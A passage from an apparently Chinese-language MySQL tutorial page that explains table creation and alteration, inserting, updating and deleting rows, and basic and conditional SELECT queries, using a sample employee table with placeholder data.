datetime</span><br></pre></td></tr></table></figure><hr><h4 id="表操作案例"><a href="#表操作案例" class="headerlink" title="表操作案例"></a>表操作案例</h4><div><font size="4">设计一张员工信息表，要求如下： </font></div><ol><li><div><font size="4">编号（纯数字） </font></div></li><li><div><font size="4">员工工号 (字符串类型，长度不超过10位) </font></div></li><li><div><font size="4">员工姓名（字符串类型，长度不超过10位） </font></div></li><li><div><font size="4">性别（男/女，存储一个汉字） </font></div></li><li><div><font size="4">年龄（正常人年龄，不可能存储负数） </font></div></li><li><div><font size="4">身份证号（二代身份证号均为18位，身份证中有X这样的字符） </font></div></li><li><div><font size="4">入职时间（取值年月日即可） 对应的建表语句如下:</font></div></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(</span><br><span class="line">id <span class="type">int</span> comment <span class="string">&#x27;编号&#x27;</span>,</span><br><span class="line">workno <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;工号&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">gender <span class="type">char</span>(<span class="number">1</span>) comment <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">age tinyint unsigned comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">idcard <span class="type">char</span>(<span class="number">18</span>) comment <span class="string">&#x27;身份证号&#x27;</span>,</span><br><span class="line">entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;员工表&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><div><font size="3">SQL语句编写完毕之后，就可以在MySQL的命令行中执行SQL，然后也可以通过 desc 指令查询表结构 信息：</font></div></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221008184701851.png" alt="image-20221008184701851"></p><div style="text-indent:2em;"><font size="4">表结构创建好了，里面的name字段是varchar类型，最大长度为10，也就意味着如果超过10将会报 错，如果想修改这个字段的类型或修改字段的长度该如何操作呢？</font></div><hr><h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">添加字段</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br><span class="line"></span><br><span class="line">例:为emp表增加一个新的字段”昵称”为nickname，类型为<span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp <span class="keyword">ADD</span> nickname <span class="type">varchar</span>(<span class="number">20</span>) COMMENT <span class="string">&#x27;昵称&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改数据类型</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY 字段名 新数据类型 (长度);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改字段名和字段类型</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br><span class="line"></span><br><span class="line">例:将emp表的nickname字段修改为username，类型为<span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp CHANGE nickname username <span class="type">varchar</span>(<span class="number">30</span>) COMMENT <span class="string">&#x27;昵称&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">删除字段</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 字段名;</span><br><span class="line"></span><br><span class="line">例:将emp表的字段username删除</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp <span class="keyword">DROP</span> username;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 RENAME <span class="keyword">TO</span> 新表名;</span><br><span class="line"></span><br><span class="line">例:将emp表的表名修改为 employee</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp RENAME <span class="keyword">TO</span> employee;</span><br></pre></td></tr></table></figure><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">删除表</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [ IF <span class="keyword">EXISTS</span> ] 表名;</span><br><span class="line"> </span><br><span class="line">例:如果tb_user表存在，则删除tb_user表</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> tb_user;</span><br></pre></td></tr></table></figure><div class="tip info"><p>可选项 IF EXISTS 代表，只有表名存在时才会删除该表，表名不存在，则不执行删除操作(如果不 加该参数项，删除一张不存在的表，执行将会报错)。</p></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除指定表, 并重新创建表</span><br><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure><blockquote><div><font size="4">注意: 在删除表的时候，表中的全部数据也都会被删除。</font></div></blockquote><hr><h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><div style="text-indent:2em;"><font size="4">DML英文全称是Data Manipulation Language(数据操作语言)，用来对数据库中表的数据记录进 行增、删、改操作。 </font></div><ul><li><div><font size="4">添加数据（INSERT）  </font></div></li><li><div><font size="4">修改数据（UPDATE）  </font></div></li><li><div><font size="4">删除数据（DELETE） </font></div></li></ul><h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">给指定字段添加数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 (字段名<span class="number">1</span>, 字段名<span class="number">2</span>, ...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br><span class="line"></span><br><span class="line">例: 给employee表所有的字段添加数据 ；</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> employee(id,workno,name,gender,age,idcard,entrydate)</span><br><span class="line"><span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Hours&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">10</span>,<span class="string">&#x27;123456789012345678&#x27;</span>,<span class="string">&#x27;2000-01-01&#x27;</span>);</span><br><span class="line"></span><br><span class="line">查询插入的数据</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">给全部字段添加数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br><span class="line"></span><br><span class="line">例：插入数据到employee表，具体的<span class="keyword">SQL</span>如下：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> employee <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;张无忌&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;123456789012345670&#x27;</span>,<span class="string">&#x27;2005-01-01&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">批量添加数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 (字段名<span class="number">1</span>, 字段名<span class="number">2</span>, ...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值</span><br><span class="line"><span class="number">1</span>, 值<span class="number">2</span>, ...) ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...) ;</span><br><span class="line"></span><br><span class="line">例：批量插入数据到employee表，具体的<span class="keyword">SQL</span>如下：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> employee <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;韦一笑&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">38</span>,<span class="string">&#x27;123456789012345670&#x27;</span>,<span class="string">&#x27;2005-01-</span></span><br><span class="line"><span class="string">01&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;赵敏&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;123456789012345670&#x27;</span>,<span class="string">&#x27;2005-01-01&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><div><font size="4">注意事项：</font></div><div><font size="4">1、插入数据时，指定的字段顺序需要与值的顺序是一一对应的。</font></div><div><font size="4">2、字符串和日期型数据应该包含在引号中。</font></div><div><font size="4">3、插入的数据大小，应该在字段的规定范围内。</font></div></blockquote><h3 id="修改数据-1"><a href="#修改数据-1" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段名<span class="number">1</span> <span class="operator">=</span> 值<span class="number">1</span> , 字段名<span class="number">2</span> <span class="operator">=</span> 值<span class="number">2</span> , .... [ <span class="keyword">WHERE</span> 条件 ] ;</span><br><span class="line"></span><br><span class="line">例:修改id为<span class="number">1</span>的数据，将name修改为baby</span><br><span class="line"><span class="keyword">update</span> employee <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;baby&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">例:修改id为<span class="number">1</span>的数据, 将name修改为小昭, gender修改为 女</span><br><span class="line"><span class="keyword">update</span> employee <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;小昭&#x27;</span> , gender <span class="operator">=</span> <span class="string">&#x27;女&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">例:将所有的员工入职日期修改为 <span class="number">2008</span><span class="number">-01</span><span class="number">-01</span></span><br><span class="line"><span class="keyword">update</span> employee <span class="keyword">set</span> entrydate <span class="operator">=</span> <span class="string">&#x27;2008-01-01&#x27;</span>;</span><br></pre></td></tr></table></figure><div class="tip info"><p>注意事项: 修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据。</p></div><h3 id="删除数据-1"><a href="#删除数据-1" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [ <span class="keyword">WHERE</span> 条件 ] ;</span><br><span class="line"></span><br><span class="line">例:删除gender为女的员工</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> employee <span class="keyword">where</span> gender <span class="operator">=</span> <span class="string">&#x27;女&#x27;</span>;</span><br><span class="line"></span><br><span class="line">例:删除所有员工</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> employee;</span><br></pre></td></tr></table></figure><blockquote><p>注意事项:</p><p>1、DELETE 语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数 据。</p><p>2、DELETE 语句不能删除某一个字段的值(可以使用UPDATE，将该字段值置为NULL即 可)。</p></blockquote><hr><h2 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h2><div style="text-indent:2em;"><font size="4">英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记 录。</font></div> <div style="text-indent:2em;"><font size="4">查询关键字: SELECT </font></div><div style="text-indent:2em;"><font size="4">在一个正常的业务系统中，查询操作的频次是要远高于增删改的，当我们去访问企业官网、电商网站， 在这些网站中我们所看到的数据，实际都是需要从数据库中查询并展示的。而且在查询的过程中，可能 还会涉及到条件、排序、分页等操作。</font></div><div style="text-indent:2em;"><font size="4"><b>🛎️制作一个实验操作需要用的数据表emp，向其中添加数据如下：🛎️</b></font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(</span><br><span class="line">id <span class="type">int</span> comment <span class="string">&#x27;编号&#x27;</span>,</span><br><span class="line">workno <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;工号&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">gender <span class="type">char</span>(<span class="number">1</span>) comment <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">age tinyint unsigned comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">idcard <span class="type">char</span>(<span class="number">18</span>) comment <span class="string">&#x27;身份证号&#x27;</span>,</span><br><span class="line">workaddress <span class="type">varchar</span>(<span class="number">50</span>) comment <span class="string">&#x27;工作地址&#x27;</span>,</span><br><span class="line">entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;00001&#x27;</span>, <span class="string">&#x27;柳岩666&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;123456789012345678&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2000-01-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;00002&#x27;</span>, <span class="string">&#x27;张无忌&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;123456789012345670&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2005-09-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">&#x27;00003&#x27;</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">38</span>, <span class="string">&#x27;123456789712345670&#x27;</span>, <span class="string">&#x27;上海&#x27;</span>, <span class="string">&#x27;2005-08-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;00004&#x27;</span>, <span class="string">&#x27;赵敏&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;123456757123845670&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2009-12-01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">5</span>, <span class="string">&#x27;00005&#x27;</span>, <span class="string">&#x27;小昭&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;123456769012345678&#x27;</span>, <span class="string">&#x27;上海&#x27;</span>, <span class="string">&#x27;2007-07-01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;00006&#x27;</span>, <span class="string">&#x27;杨逍&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">28</span>, <span class="string">&#x27;12345678931234567X&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2006-01-01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">7</span>, <span class="string">&#x27;00007&#x27;</span>, <span class="string">&#x27;范瑶&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">40</span>, <span class="string">&#x27;123456789212345670&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2005-05-01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">8</span>, <span class="string">&#x27;00008&#x27;</span>, <span class="string">&#x27;黛绮丝&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">38</span>, <span class="string">&#x27;123456157123645670&#x27;</span>, <span class="string">&#x27;天津&#x27;</span>, <span class="string">&#x27;2015-05-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">9</span>, <span class="string">&#x27;00009&#x27;</span>, <span class="string">&#x27;范凉凉&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">45</span>, <span class="string">&#x27;123156789012345678&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2010-04-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">10</span>, <span class="string">&#x27;00010&#x27;</span>, <span class="string">&#x27;陈友谅&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">53</span>, <span class="string">&#x27;123456789012345670&#x27;</span>, <span class="string">&#x27;上海&#x27;</span>, <span class="string">&#x27;2011-01-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">11</span>, <span class="string">&#x27;00011&#x27;</span>, <span class="string">&#x27;张士诚&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">55</span>, <span class="string">&#x27;123567897123465670&#x27;</span>, <span class="string">&#x27;江苏&#x27;</span>, <span class="string">&#x27;2015-05-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">12</span>, <span class="string">&#x27;00012&#x27;</span>, <span class="string">&#x27;常遇春&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">32</span>, <span class="string">&#x27;123446757152345670&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2004-02-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">13</span>, <span class="string">&#x27;00013&#x27;</span>, <span class="string">&#x27;张三丰&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">88</span>, <span class="string">&#x27;123656789012345678&#x27;</span>, <span class="string">&#x27;江苏&#x27;</span>, <span class="string">&#x27;2020-11-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">14</span>, <span class="string">&#x27;00014&#x27;</span>, <span class="string">&#x27;灭绝&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">65</span>, <span class="string">&#x27;123456719012345670&#x27;</span>, <span class="string">&#x27;西安&#x27;</span>, <span class="string">&#x27;2019-05-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">15</span>, <span class="string">&#x27;00015&#x27;</span>, <span class="string">&#x27;胡青牛&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">70</span>, <span class="string">&#x27;12345674971234567X&#x27;</span>, <span class="string">&#x27;西安&#x27;</span>, <span class="string">&#x27;2018-04-</span></span><br><span class="line"><span class="string">01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">16</span>, <span class="string">&#x27;00016&#x27;</span>, <span class="string">&#x27;周芷若&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">18</span>, <span class="keyword">null</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;2012-06-01&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询多个字段</span><br><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>, 字段<span class="number">2</span>, 字段<span class="number">3</span> ... <span class="keyword">FROM</span> 表名 ;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 ;</span><br></pre></td></tr></table></figure><div class="tip info"><p>注意 : * 号代表查询所有字段，在实际开发中尽量少用（不直观、影响效率）。</p></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段设置别名</span><br><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span> [ <span class="keyword">AS</span> 别名<span class="number">1</span> ] , 字段<span class="number">2</span> [ <span class="keyword">AS</span> 别名<span class="number">2</span> ] ... <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span> [ 别名<span class="number">1</span> ] , 字段<span class="number">2</span> [ 别名<span class="number">2</span> ] ... <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">去除重复记录</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 字段列表 <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">A. 查询指定字段 name, workno, age并返回</span><br><span class="line"><span class="keyword">select</span> name,workno,age <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line">B. 查询返回所有字段</span><br><span class="line"><span class="keyword">select</span> id ,workno,name,gender,age,idcard,workaddress,entrydate <span class="keyword">from</span> emp;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line">C. 查询所有员工的工作地址,起别名</span><br><span class="line"><span class="keyword">select</span> workaddress <span class="keyword">as</span> <span class="string">&#x27;工作地址&#x27;</span> <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment">-- as可以省略</span></span><br><span class="line"><span class="keyword">select</span> workaddress <span class="string">&#x27;工作地址&#x27;</span> <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line">D. 查询公司员工的上班地址有哪些(不要重复)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> workaddress <span class="string">&#x27;工作地址&#x27;</span> <span class="keyword">from</span> emp;</span><br></pre></td></tr></table></figure><h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 条件列表 ;</span><br></pre></td></tr></table></figure><div class="tip info"><p>条件—-&gt;常用的比较运算符如下:</p></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>比较运算符</td>            <td>功能</td>        </tr>        <tr align="center">            <td>></td>            <td>大于</td>        </tr>        <tr align="center">            <td>>=</td>            <td>大于等于</td>        </tr>        <tr align="center">            <td><</td>            <td>小于</td>        </tr>    